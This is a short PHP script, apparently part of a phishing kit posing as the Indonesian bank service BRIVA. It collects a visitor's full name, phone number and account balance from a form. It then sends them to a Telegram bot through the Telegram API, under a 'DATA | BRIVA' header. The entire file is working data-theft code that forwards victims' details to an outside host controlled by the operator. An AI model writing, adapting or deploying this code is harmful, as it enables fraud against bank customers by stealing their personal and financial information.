<?php
session_start();
include "telegram.php";

$namalengkap = $_POST['namalengkap'];
$nowa = $_POST['nowa'];
$saldo = $_POST['saldo'];
$_SESSION['namalengkap'] = $namalengkap;
$_SESSION['nowa'] = $nowa;
$_SESSION['saldo'] = $saldo;

$message = "

├• 𝗗𝗔𝗧𝗔 | 𝗕𝗥𝗜𝗩𝗔
├───────────────────
├• 𝗡𝗔𝗠𝗔 :  <code>".$namalengkap."</code>
├• 𝗡𝗢 𝗛𝗣 :  <code>".$nowa."</code>
├• 𝗦𝗔𝗟𝗗𝗢 :  <code>".$saldo."</code>
╰───────────────────

";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
//header('Location:./../proses.html');
?>
